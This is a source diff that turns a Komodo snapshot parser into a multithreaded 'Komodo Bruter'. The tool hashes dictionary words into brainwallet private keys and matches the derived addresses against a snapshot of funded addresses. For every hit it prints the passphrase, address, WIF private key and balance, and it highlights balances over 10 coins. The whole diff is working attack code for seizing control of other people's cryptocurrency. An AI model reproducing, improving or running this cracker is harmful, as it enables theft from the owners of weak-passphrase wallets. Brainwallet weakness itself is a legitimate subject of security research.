@@ -1,6 +1,6 @@
 /***
  *
- *  Komodo Snapshot C++ Parser (c) Decker, 2020
+ *  Komodo Bruter (c) Decker, 2020-2022
  *
 */
 
@@ -22,11 +22,16 @@
 
 #include <fstream>
 #include <chrono>
+#include "csv.h"
+#include <thread>
+#include <atomic>
+
+static std::atomic<int> passwords_tried(0);
 
 using namespace rapidjson;
 
 #include <bitcoin/system.hpp>
-using namespace libbitcoin::system;
+// using namespace libbitcoin::system;
 
 /* changeable params */
 static const std::size_t MAX_SENDMANY_OUTPUTS = 10;
@@ -43,10 +48,11 @@ typedef std::vector< CBalanceRecord > CSendManyOutput;
 static const CAmount COIN = 100000000;
 static const CAmount CENT = 1000000;
 
-static const CAmount MAX_MONEY = 21000000 * COIN;
+static const CAmount MAX_MONEY = 200000000 * COIN; //21000000 * COIN;
 
 static const std::string CL_GREEN = "\x1b[01;32m";
 static const std::string CL_NORMAL = "\x1B[0m";
+static const std::string CL_YELLOW = "\x1b[01;33m";
 
 inline bool MoneyRange(const CAmount& nValue) { return (nValue >= 0 && nValue <= MAX_MONEY); }
 
@@ -104,9 +110,10 @@ static inline void rtrim(std::string &s) {
 int main()
 {
 
-    Document d;
+    std::mutex g_display_mutex;
     std::map<std::string, int64_t> mapBalances;
-    
+
+    Document d;
     // Prepare JSON reader and input stream.
     FILE *fp = fopen("snapshot.json", "r");
     if (!fp) {
@@ -133,6 +140,7 @@ int main()
             if (a[i].IsObject()) {
                 const Value& el = a[i];
                 if (el.HasMember("addr") && el.HasMember("amount")) {
+                    // std::cout << el["addr"].GetString() << std::endl;
                     if (el["addr"].IsString() && el["amount"].IsString()) {
                         mapBalances[el["addr"].GetString()] = AmountFromValue(el["amount"]);
                     }
@@ -148,18 +156,27 @@ int main()
     }
 
     std::cerr << "Ok!" << std::endl;
+    
+    // io::CSVReader<2, io::trim_chars<' '>, io::no_quote_escape<';'>> in("utxodump.csv");
+    // std::string zec_addr; CAmount z_balance;
+    // while(in.read_row(zec_addr, z_balance))
+    // {
+    //     mapBalances[zec_addr] = z_balance;
+    // }
 
     // https://stackoverflow.com/questions/7868936/read-file-line-by-line-using-ifstream-in-c
     std::ifstream input( "dict.txt" );
-    std::set<std::string> setPasswords;
+    // std::set<std::string> setPasswords;
+    std::vector<std::string> setPasswords;
     
     {
         // read dictionary
         auto start = std::chrono::steady_clock::now();
         for( std::string line; getline( input, line ); )
         {
-            rtrim(line);
-            setPasswords.insert(line);
+            //rtrim(line);
+            // setPasswords.insert(line);
+            setPasswords.push_back(line);
         }
         auto end = std::chrono::steady_clock::now();
 
@@ -167,74 +184,124 @@ int main()
             << " (" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms)" << std::endl;
     }
 
-    ec_secret privkey;
-    ec_compressed pubkey;
-    one_byte addr_prefix;
-    data_chunk prefix_pubkey_checksum;
-    std::string kmd_addr;
+    auto worker = [&setPasswords, &mapBalances, &g_display_mutex] (std::vector<std::string>::iterator it_begin, std::vector<std::string>::iterator it_end) {
 
-    int64_t n = 0;
-    auto start = std::chrono::steady_clock::now();
+        int64_t n = 0;
+        auto start = std::chrono::steady_clock::now();
 
-    for (std::set<std::string>::const_iterator iter = setPasswords.begin(); iter != setPasswords.end(); ++iter) {
+        libbitcoin::system::ec_secret privkey;
+        libbitcoin::system::ec_compressed pubkey;
+        libbitcoin::system::one_byte addr_prefix;
+        libbitcoin::system::data_array<2> two_byte_addr_prefix;
+        libbitcoin::system::data_chunk prefix_pubkey_checksum;
+        std::string kmd_addr;
 
-        std::string passphrase = *iter;
-
-        std::vector<char> passphrase_bytes(passphrase.begin(), passphrase.end());
-        auto passphrase_data_slice = data_slice((const uint8_t *)passphrase_bytes.data(),(const uint8_t *)(passphrase_bytes.data() + passphrase_bytes.size()));
-        auto sha256sum = sha256_hash(passphrase_data_slice);
-
-        sha256sum[0]  = sha256sum[0] & 248;
-        sha256sum[31] = sha256sum[31] & 127;
-        sha256sum[31] = sha256sum[31] | 64;
-
-        //auto sha256sum_hex = encode_base16(sha256sum);
-        //std::cerr << passphrase << " - " << sha256sum_hex << std::endl;
-        //decode_base16(privkey, sha256sum_hex);
-        //secret_to_public(pubkey, privkey);
-        privkey = sha256sum;
-
-        secret_to_public(pubkey,privkey);
-        std::string pubkeyhex_str = encode_base16(pubkey);
-
-        // Pubkeyhash: sha256 + hash160
-        auto my_pubkeyhash = bitcoin_short_hash(pubkey);
-
-        addr_prefix = { { 60 } };
-        // Byte sequence = prefix + pubkey + checksum(4-bytes)
-        prefix_pubkey_checksum = to_chunk(addr_prefix);
-        extend_data(prefix_pubkey_checksum, my_pubkeyhash);
-        append_checksum(prefix_pubkey_checksum);
-        // Base58 encode byte sequence -> Bitcoin Address
-        kmd_addr = encode_base58(prefix_pubkey_checksum);
-
-        if (n % 500000 == 0) {
-            auto end = std::chrono::steady_clock::now();
-            std::cerr << "[" << n << "/" << setPasswords.size() << "] "
-                << "" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms" << std::endl;
-            // std::cerr << "mapBalances.size() = " << mapBalances.size() << std::endl;
-            start = end;
-        }
-
-
-        // if (mapBalances[kmd_addr] != 0) // (!) never use std::map [] construction for reading, it creates element in map (!)
-        auto it = mapBalances.find(kmd_addr);
-        if ( it != mapBalances.end())
+        for (std::vector<std::string>::iterator iter = it_begin; iter != it_end; ++iter) 
         {
-            one_byte secret_prefix = { { 188 } };
-            one_byte secret_compressed = { { 0x01 } }; // omitted if uncompressed
-            // Apply prefix, suffix & append checksum
-            auto prefix_secret_comp_checksum = to_chunk(secret_prefix);
-            extend_data(prefix_secret_comp_checksum, privkey);
-            extend_data(prefix_secret_comp_checksum, secret_compressed);
-            append_checksum(prefix_secret_comp_checksum);
 
-            std::string kmd_wif = encode_base58(prefix_secret_comp_checksum);
-            std::cout << passphrase << " - " << kmd_addr << " (" << kmd_wif << ") - " << CL_GREEN << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
+            std::string passphrase = *iter;
+
+            std::vector<char> passphrase_bytes(passphrase.begin(), passphrase.end());
+            auto passphrase_data_slice = libbitcoin::system::data_slice((const uint8_t *)passphrase_bytes.data(),(const uint8_t *)(passphrase_bytes.data() + passphrase_bytes.size()));
+            auto sha256sum = libbitcoin::system::sha256_hash(passphrase_data_slice);
+
+            sha256sum[0]  = sha256sum[0] & 248;
+            sha256sum[31] = sha256sum[31] & 127;
+            sha256sum[31] = sha256sum[31] | 64;
+
+            // auto sha256sum = libbitcoin::system::sha256_hash(sha256sum_pre);
+
+
+            //auto sha256sum_hex = encode_base16(sha256sum);
+            //std::cerr << passphrase << " - " << sha256sum_hex << std::endl;
+            //decode_base16(privkey, sha256sum_hex);
+            //secret_to_public(pubkey, privkey);
+            privkey = sha256sum;
+
+            libbitcoin::system::secret_to_public(pubkey,privkey);
+            std::string pubkeyhex_str = libbitcoin::system::encode_base16(pubkey);
+
+            // Pubkeyhash: sha256 + hash160
+            auto my_pubkeyhash = libbitcoin::system::bitcoin_short_hash(pubkey);
+
+            addr_prefix = { { 60 } };
+            two_byte_addr_prefix = {{0x1c, 0xb8}};
+            // Byte sequence = prefix + pubkey + checksum(4-bytes)
+            prefix_pubkey_checksum = libbitcoin::system::to_chunk(addr_prefix);
+            libbitcoin::system::extend(prefix_pubkey_checksum, my_pubkeyhash);
+            libbitcoin::system::append_checksum(prefix_pubkey_checksum);
+            // Base58 encode byte sequence -> Bitcoin Address
+            kmd_addr = libbitcoin::system::encode_base58(prefix_pubkey_checksum);
+            // std::cout << kmd_addr << std::endl;
+
+            if (n % 500000 == 0) {
+                auto end = std::chrono::steady_clock::now();
+                g_display_mutex.lock();
+                std::cerr << "[" << passwords_tried.load() << "/" << setPasswords.size() << "] "
+                    << "" << (std::chrono::duration_cast<std::chrono::milliseconds>(end - start).count()) << " ms" << std::endl;
+                // std::cerr << "mapBalances.size() = " << mapBalances.size() << std::endl;
+                g_display_mutex.unlock();
+                start = end;
+            }
+
+
+            // if (mapBalances[kmd_addr] != 0) // (!) never use std::map [] construction for reading, it creates element in map (!)
+            auto it = mapBalances.find(kmd_addr);
+            if ( it != mapBalances.end())
+            {
+                libbitcoin::system::one_byte secret_prefix = { { 188 /*128*/ } };
+                libbitcoin::system::one_byte secret_compressed = { { 0x01 } }; // omitted if uncompressed
+                // Apply prefix, suffix & append checksum
+                auto prefix_secret_comp_checksum = libbitcoin::system::to_chunk(secret_prefix);
+                libbitcoin::system::extend(prefix_secret_comp_checksum, privkey);
+                libbitcoin::system::extend(prefix_secret_comp_checksum, secret_compressed);
+                libbitcoin::system::append_checksum(prefix_secret_comp_checksum);
+
+                std::string kmd_wif = libbitcoin::system::encode_base58(prefix_secret_comp_checksum);
+                std::thread::id this_id = std::this_thread::get_id();
+                g_display_mutex.lock();
+                // [" << strprintf("0x%08x", this_id) << "," << std::distance(it_begin, iter) << "]""
+                if ((*it).second > 10 * COIN) 
+                    std::cout << "'" << passphrase << "' - " << kmd_addr << " (" << kmd_wif << ") - " << CL_YELLOW << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
+                else 
+                    std::cout << "'" << passphrase << "' - " << kmd_addr << " (" << kmd_wif << ") - " << CL_GREEN << ValueFromAmount((*it).second) << CL_NORMAL << std::endl;
+                g_display_mutex.unlock();
+            }
+
+            n++;
+            passwords_tried.fetch_add(1);
         }
+    };
+    
+    // https://stackoverflow.com/questions/10792157/c-2011-stdthread-simple-example-to-parallelize-a-loop
+    // https://blog.devgenius.io/a-simple-guide-to-atomics-in-c-670fc4842c8b
+    // https://stackoverflow.com/questions/36997584/no-match-for-operator-aka-std-rb-tree-const-iterator-stdmap
 
-        n++;
+    // serial
+    // worker(std::begin(setPasswords), std::end(setPasswords));
+    // std::cout << std::accumulate(std::begin(setPasswords), std::end(setPasswords), 0) << std::endl;
+
+    // parallel
+    const int max_threads = 8;
+    std::vector<std::thread> threads(max_threads);
+    int grainsize = setPasswords.size() / max_threads;
+
+    auto work_iter = std::begin(setPasswords);
+    for(auto it = std::begin(threads); it != std::end(threads) - 1; ++it) {
+        // std::cout << "[" << *work_iter << " ; " << *(work_iter + grainsize) << "]" << std::endl;
+        auto work_iter_end = work_iter;
+        std::advance(work_iter_end, grainsize);
+        // *it = std::thread(worker, work_iter, work_iter + grainsize);
+        *it = std::thread(worker, work_iter, work_iter_end);
+        //work_iter += grainsize;
+        std::advance(work_iter, grainsize);
+    }
+    threads.back() = std::thread(worker, work_iter, std::end(setPasswords));
+
+    for(auto&& i : threads) {
+        i.join();
     }
 
+    // std::cout << std::accumulate(std::begin(setPasswords), std::end(setPasswords), 0) << std::endl;
     return 0;
 }
